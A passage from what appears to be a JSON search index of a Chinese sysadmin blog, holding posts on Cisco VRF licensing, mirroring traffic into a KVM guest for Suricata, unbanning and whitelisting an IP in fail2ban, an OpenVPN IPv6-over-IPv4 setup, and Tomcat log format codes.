class=\"m\"\u003e1300\u003c/span\u003e conform-action transmit  exceed-action set-prec-transmit \u003cspan class=\"m\"\u003e1\u003c/span\u003e violate-action drop\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"双速双桶\"\u003e双速双桶：\u003c/h5\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240124161442705\" loading=\"lazy\" src=\"/posts/20240124-cisco_qos/image-20240124161442705.png\"\u003e\u003c/p\u003e","title":"Cisco路由器上qos的设置"},{"content":"作为一个运维，现在搞起了Ciso的BGP生意\n在Cisco3650上定义VRF，结果报错，一头雾水啊，而且对Cisco也不熟悉啊。\n#vrf definition mgmt % Feature is not supported 没办法搜Google啊，解决方法如下：\nsh license right-to-use license right-to-use activate ipservices all reload license right-to-use activate ipservices all acceptEULA reload 最后显示ipservices和lanbase都有就行了\n#sh license right-to-use Slot# License name Type Count Period left ---------------------------------------------------------- 1 ipservices permanent N/A Lifetime 1 lanbase permanent N/A Lifetime ","permalink":"https://rendoumi.com/posts/20240124-vrf/","summary":"\u003cp\u003e作为一个运维，现在搞起了Ciso的BGP生意\u003c/p\u003e\n\u003cp\u003e在Cisco3650上定义VRF，结果报错，一头雾水啊，而且对Cisco也不熟悉啊。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#vrf definition mgmt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e% Feature is not supported\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e没办法搜Google啊，解决方法如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esh license right-to-use  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elicense right-to-use activate ipservices all  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ereload  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elicense right-to-use activate ipservices all acceptEULA  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ereload  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e最后显示ipservices和lanbase都有就行了\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#sh license right-to-use\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e Slot#  License name   Type     Count   Period left \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e----------------------------------------------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e      ipservices   permanent     N/A   Lifetime\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e      lanbase      permanent     N/A   Lifetime\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Cisco vrf错误之the feature does not supported"},{"content":"由于大搞BGP线路，所以在Cisco路由器上Mirror了入口的流量到另外一个端口，供suricata分析用。\n在Mirror直通kvm虚机过程中遇到以下问题：\nMirror的口是Te口，10G的流量，在宿主机上tcpdump可以看到所有流量，但是在kvm上则断断续续，流量丢失一部分，原因很简单：\n流量的聚合和转发未配置好，两条命令解决\nbrctl setageing br2 0 brctl setfd br2 0 但是，如何在宿主机启动的时候自动执行这两句呢？简单，如果系统是CentOS\ncat \u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/sbin/ifup-local #!/bin/bash brctl setageing br2 0 brctl setfd br2 0 EOF chmod 755 /sbin/ifup-local 如果系统是Ubuntu\ncd /etc/network/if-up.d cat \u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;br3-mirror #!/bin/bash if [ \u0026#34;$IFACE\u0026#34; = br2 ]; then brctl setageing br2 0 brctl setfd br2 0 fi EOF chmod +x br2-mirror 在宿主机上问题解决了，在kvm虚机上又遇到问题，Ubuntu，如果让一个网口启动但没有地址呢？\nvi /etc/network/interfaces auto ens7 iface ens7 inet manual mtu 1464 up ifconfig ens7 up 注意上面的，ens7就是mirror过来的网口，mtu是因为在cisco做mirror的时候指定了固定的mtu 1464.\nbrctl命令的用法可以参见以下链接：\nhttps://www.thegeekstuff.com/2017/06/brctl-bridge/\nover.\n","permalink":"https://rendoumi.com/posts/20240124-kvm_mirror/","summary":"\u003cp\u003e由于大搞BGP线路，所以在Cisco路由器上Mirror了入口的流量到另外一个端口，供\u003ccode\u003esuricata\u003c/code\u003e分析用。\u003c/p\u003e\n\u003cp\u003e在Mirror直通kvm虚机过程中遇到以下问题：\u003c/p\u003e\n\u003cp\u003eMirror的口是Te口，10G的流量，在宿主机上tcpdump可以看到所有流量，但是在kvm上则断断续续，流量丢失一部分，原因很简单：\u003c/p\u003e\n\u003cp\u003e流量的聚合和转发未配置好，两条命令解决\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebrctl setageing br2 \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebrctl setfd br2 \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e但是，如何在宿主机启动的时候自动执行这两句呢？简单，如果系统是CentOS\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/sbin/ifup-local  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ebrctl setageing br2 0  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ebrctl setfd br2 0  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e755\u003c/span\u003e /sbin/ifup-local  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如果系统是Ubuntu\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /etc/network/if-up.d  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;br3-mirror  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eif [ \u0026#34;$IFACE\u0026#34; = br2 ]; then  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ebrctl setageing br2 0  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ebrctl setfd br2 0  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003efi  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod +x br2-mirror  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e在宿主机上问题解决了，在kvm虚机上又遇到问题，Ubuntu，如果让一个网口启动但没有地址呢？\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/network/interfaces  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauto ens7  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiface ens7 inet manual  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    mtu \u003cspan class=\"m\"\u003e1464\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eup ifconfig ens7 up  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意上面的，ens7就是mirror过来的网口，mtu是因为在cisco做mirror的时候指定了固定的mtu 1464.\u003c/p\u003e\n\u003cp\u003ebrctl命令的用法可以参见以下链接：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.thegeekstuff.com/2017/06/brctl-bridge/\"\u003ehttps://www.thegeekstuff.com/2017/06/brctl-bridge/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eover.\u003c/p\u003e","title":"Mirror 口直通到Kvm中去遇到的几个问题"},{"content":"mouse 的服务器连接到了各个网络核心设备，所以采用了很严格的ip限制，port限制，以及fail2ban来阻止非法访问，但是不巧，把自己也给搞到 jail 里去了。\n那么怎么解呢？\n首先查看封锁情况：\nfail2ban-client status Status |- Number of jail: 2 `- Jail list: sshd, sshd-ddos 有两个jail，sshd和sshd-ddos\n进一步查看：\nfail2ban-client status sshd 发现自己被屏蔽了。\n解封的方法：\nfail2ban-client set sshd unbanip 103.108.236.5 解封只是临时的，永久放入白名单最靠谱：\nvi /etc/fail2ban/jail.conf ignoreip = 103.108.236.5/32 重启fail2ban\nsystemctl restart fail2ban 这样就ok了。\n","permalink":"https://rendoumi.com/posts/20240124-fail2ban_unban/","summary":"\u003cp\u003emouse 的服务器连接到了各个网络核心设备，所以采用了很严格的ip限制，port限制，以及fail2ban来阻止非法访问，但是不巧，把自己也给搞到 jail 里去了。\u003c/p\u003e\n\u003cp\u003e那么怎么解呢？\u003c/p\u003e\n\u003cp\u003e首先查看封锁情况：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efail2ban-client status\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStatus  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e- Number of jail:    \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e- Jail list:    sshd, sshd-ddos\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e有两个jail，sshd和sshd-ddos\u003c/p\u003e\n\u003cp\u003e进一步查看：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efail2ban-client status sshd  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20240124160424122\" loading=\"lazy\" src=\"/posts/20240124-fail2ban_unban/image-20240124160424122.png\"\u003e\u003c/p\u003e\n\u003cp\u003e发现自己被屏蔽了。\u003c/p\u003e\n\u003cp\u003e解封的方法：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efail2ban-client \u003cspan class=\"nb\"\u003eset\u003c/span\u003e sshd unbanip 103.108.236.5  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e解封只是临时的，永久放入白名单最靠谱：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/fail2ban/jail.conf  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eignoreip\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 103.108.236.5/32  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e重启fail2ban\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl restart fail2ban  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样就ok了。\u003c/p\u003e","title":"Fail2ban怎么解放并放入白名单"},{"content":"先普及一下IPv6 地址。\nIPv6 地址大小为 128 位。\n首选 IPv6 地址表示法为8组数字用冒号分隔，其中每组是 8 个 16 位部分的十六进制值。IPv6 地址范围从 0000:0000:0000:0000:0000:0000:0000:0000 至 ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff。\n除此首选格式之外，IPv6 地址还可以用其他两种短格式指定：\n省略前导零 通过省略前导零指定 IPv6 地址。 例如，IPv6 地址 1050:0000:0000:0000:0005:0600:300c:326b 可写作 1050:0:0:0:5:600:300c:326b。 双冒号 通过使用双冒号（::）替换一系列零来指定 IPv6 地址。 例如，IPv6 地址 ff06:0:0:0:0:0:0:c3 可写作 ff06::c3。 一个 IP 地址中只可使用一次双冒号。 在一般IPv6网络环境下，一个局域网的子网大小为/64，接口通过NDP协议获得自己的唯一IPv6地址（前64位为子网前缀，后64位一般由接口本身的MAC地址产生）\n我们的场景：\n服务器的IPV4地址是 1.2.3.4 服务器的IPV6地址是 aaaa:bbbb:cccc:dddd::/64 IPV4和IPV6的地址都在eth0上 VPN分配给客户端的IPV6地址是aaaa:bbbb:cccc:dddd:80::/112，使用的接口是tun0 配置过程如下： 首先修改/etc/sysctl.conf文件\nnet.ipv4.ip_forward=1 ... net.ipv6.conf.all.forwarding=1 net.ipv6.conf.all.proxy_ndp = 1 ... net.ipv4.conf.all.accept_redirects = 0 net.ipv6.conf.all.accept_redirects = 0 ... net.ipv4.conf.all.send_redirects = 0 接下来，可以先做iptable，使得openvpn server对包进行SNAT\niptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 或者 iptables -t nat -A POSTROUTING -s 10.11.0.0/16 -j SNAT --to 172.16.8.1 编辑/etc/openvpn/variables变量\n# 客户端IP段前缀 # Tunnel subnet prefix prefix=aaaa:bbbb:cccc:dddd:80: # netmask prefixlen=112 准备两个脚本，在与客户端建立连接和断开连接时执行，用来建立或者取消NDP proxy rules。 /etc/openvpn/up.sh\n#!/bin/sh # Check client variables if [ -z \u0026#34;$ifconfig_pool_remote_ip\u0026#34; ] || [ -z \u0026#34;$common_name\u0026#34; ]; then echo \u0026#34;Missing environment variable.\u0026#34; exit 1 fi # Load server variables . /etc/openvpn/variables ipv6=\u0026#34;\u0026#34; ipp=$(echo \u0026#34;$ifconfig_pool_remote_ip\u0026#34; | cut -d. -f4) if ! [ \u0026#34;$ipp\u0026#34; -ge 2 -a \u0026#34;$ipp\u0026#34; -le 254 ] 2\u0026gt;/dev/null; then echo \u0026#34;Invalid IPv4 part.\u0026#34; exit 1 fi hexipp=$(printf \u0026#39;%x\u0026#39; $ipp) ipv6=\u0026#34;$prefix$hexipp\u0026#34; # Create proxy rule /sbin/ip -6 neigh add proxy $ipv6 dev eth0 /etc/openvpn/down.sh\n#!/bin/sh # Check client variables if [ -z \u0026#34;$ifconfig_pool_remote_ip\u0026#34; ] || [ -z \u0026#34;$common_name\u0026#34; ]; then echo \u0026#34;Missing environment variable.\u0026#34; exit 1 fi # Load server variables . /etc/openvpn/variables ipv6=\u0026#34;\u0026#34; ipp=$(echo \u0026#34;$ifconfig_pool_remote_ip\u0026#34; | cut -d. -f4) if ! [ \u0026#34;$ipp\u0026#34; -ge 2 -a \u0026#34;$ipp\u0026#34; -le 254 ] 2\u0026gt;/dev/null; then echo \u0026#34;Invalid IPv4 part.\u0026#34; exit 1 fi hexipp=$(printf \u0026#39;%x\u0026#39; $ipp) ipv6=\u0026#34;$prefix$hexipp\u0026#34; # Delete proxy rule /sbin/ip -6 neigh del proxy $ipv6 dev eth0 这两个脚本权限应该都是755\n服务器端server.conf中的相关配置：\n# Run client-specific script on connection and disconnection script-security 2 client-connect \u0026#34;/etc/openvpn/up.sh\u0026#34; client-disconnect \u0026#34;/etc/openvpn/down.sh\u0026#34; # Server mode and client subnets server 10.8.0.0 255.255.255.0 server-ipv6 aaaa:bbbb:cccc:dddd:80::/112 topology subnet # IPv6 routes push \u0026#34;route-ipv6 aaaa:bbbb:cccc:dddd::/64\u0026#34; push \u0026#34;route-ipv6 2000::/3\u0026#34; 客户端client.ovpn中的相关配置\nremote 1.2.3.4 1194 启动服务器端，然后再启动客户端连接 测试一下：\ntraceroute6 ipv6.google.com 这样就ok了。\n","permalink":"https://rendoumi.com/posts/20240124-vpn_ipv6_ipv4/","summary":"\u003cp\u003e先普及一下IPv6 地址。\u003c/p\u003e\n\u003cp\u003eIPv6 地址大小为 128 位。\u003c/p\u003e\n\u003cp\u003e首选 IPv6 地址表示法为8组数字用冒号分隔，其中每组是 8 个 16 位部分的十六进制值。IPv6 地址范围从 0000:0000:0000:0000:0000:0000:0000:0000 至 ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff。\u003c/p\u003e\n\u003cp\u003e除此首选格式之外，IPv6 地址还可以用其他两种短格式指定：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e省略前导零\n通过省略前导零指定 IPv6 地址。\n例如，IPv6 地址 1050:0000:0000:0000:0005:0600:300c:326b 可写作 1050:0:0:0:5:600:300c:326b。\u003c/li\u003e\n\u003cli\u003e双冒号\n通过使用双冒号（::）替换一系列零来指定 IPv6 地址。\n例如，IPv6 地址 ff06:0:0:0:0:0:0:c3 可写作 ff06::c3。\n一个 IP 地址中只可使用一次双冒号。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e在一般IPv6网络环境下，一个局域网的子网大小为/64，接口通过NDP协议获得自己的唯一IPv6地址（前64位为子网前缀，后64位一般由接口本身的MAC地址产生）\u003c/p\u003e\n\u003cp\u003e我们的场景：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e服务器的IPV4地址是 1.2.3.4\u003c/li\u003e\n\u003cli\u003e服务器的IPV6地址是 aaaa:bbbb:cccc:dddd::/64\u003c/li\u003e\n\u003cli\u003eIPV4和IPV6的地址都在eth0上\u003c/li\u003e\n\u003cli\u003eVPN分配给客户端的IPV6地址是aaaa:bbbb:cccc:dddd:80::/112，使用的接口是tun0\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e配置过程如下： 首先修改\u003ccode\u003e/etc/sysctl.conf\u003c/code\u003e文件\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.ip_forward\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv6.conf.all.forwarding\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv6.conf.all.proxy_ndp \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.all.accept_redirects \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv6.conf.all.accept_redirects \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.all.send_redirects \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e接下来，可以先做iptable，使得openvpn server对包进行SNAT\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e或者\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -t nat -A POSTROUTING -s 10.11.0.0/16 -j SNAT --to 172.16.8.1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e编辑\u003ccode\u003e/etc/openvpn/variables\u003c/code\u003e变量\u003c/p\u003e","title":"配置一个提供IPv6 tunnel over IPv4的OpenVPN服务器"},{"content":"我们tomcat的日志记录格式为：\npattern=\u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34; resolveHosts=\u0026#34;false\u0026#34;/\u0026gt; 都是什么意思呢？\n%a - Remote IP address %A - Local IP address %b - Bytes sent, excluding HTTP headers, or \u0026lsquo;-\u0026rsquo; if zero %B - Bytes sent, excluding HTTP headers %h - Remote host name (or IP address if resolveHosts is false) %H - Request protocol %l - Remote logical username from identd (always returns \u0026lsquo;-\u0026rsquo;) %m - Request method (GET, POST, etc.) %p - Local port on which this request was received %q - Query string (prepended with a \u0026lsquo;?\u0026rsquo; if it exists) %r - First line of the request (method and request URI) %s - HTTP status code of the response %S - User session ID %t - Date and time, in Common Log Format %u - Remote user that was authenticated (if any), else \u0026lsquo;-\u0026rsquo; %U - Requested URL path %v - Local server name %D - Time taken to process the request, in millis %T - Time taken to process the request, in seconds %I - Current request thread name (can compare later with stacktraces) 另外，还可以将request请求的查询参数、session会话变量值、cookie值或HTTP请求/响应头内容的变量值等内容写入到日志文件。\n它仿照了apache的语法：\n％{XXX}i xxx代表传入的头(HTTP Request) ％{XXX}o xxx代表传出的响应头(Http Resonse) ％{XXX}c xxx代表特定的Cookie名 ％{XXX}r xxx代表ServletRequest属性名 ％{XXX}s xxx代表HttpSession中的属性名 \u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34; 翻译过来就是\n\u0026#34;远程地址|本地地址|响应时间|X-Forwarded-For|远程用户|远程认证用户|时间|第一行|回应code|发送字节|Referer|User-Agent \u0026#34; 例子：\n10.11.9.190|10.11.10.13|0.153|111.199.189.182|-|-|[04/May/2018:21:31:02 +0800]|GET /cms/rest.htm?v=1.0 HTTP/1.0|200|48939|-|Dalvik/2.1.0 (Linux; U; Android 7.0; PIC-AL00 Build/HUAWEIPIC-AL00) 这样就比较全了，本机IP/外来IP，如果前面是nginx代理的，ip和内容以及user-agent都能记录下来，以便之后查找和处理。\n","permalink":"https://rendoumi.com/posts/20240124-tomcat_log_format/","summary":"\u003cp\u003e我们tomcat的日志记录格式为：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003epattern\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eresolveHosts\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e/\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e都是什么意思呢？\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e%a - Remote IP address\u003c/li\u003e\n\u003cli\u003e%A - Local IP address\u003c/li\u003e\n\u003cli\u003e%b - Bytes sent, excluding HTTP headers, or \u0026lsquo;-\u0026rsquo; if zero\u003c/li\u003e\n\u003cli\u003e%B - Bytes sent, excluding HTTP headers\u003c/li\u003e\n\u003cli\u003e%h - Remote host name (or IP address if resolveHosts is false)\u003c/li\u003e\n\u003cli\u003e%H - Request protocol\u003c/li\u003e\n\u003cli\u003e%l - Remote logical username from identd (always returns \u0026lsquo;-\u0026rsquo;)\u003c/li\u003e\n\u003cli\u003e%m - Request method (GET, POST, etc.)\u003c/li\u003e\n\u003cli\u003e%p - Local port on which this request was received\u003c/li\u003e\n\u003cli\u003e%q - Query string (prepended with a \u0026lsquo;?\u0026rsquo; if it exists)\u003c/li\u003e\n\u003cli\u003e%r - First line of the request (method and request URI)\u003c/li\u003e\n\u003cli\u003e%s - HTTP status code of the response\u003c/li\u003e\n\u003cli\u003e%S - User session ID\u003c/li\u003e\n\u003cli\u003e%t - Date and time, in Common Log Format\u003c/li\u003e\n\u003cli\u003e%u - Remote user that was 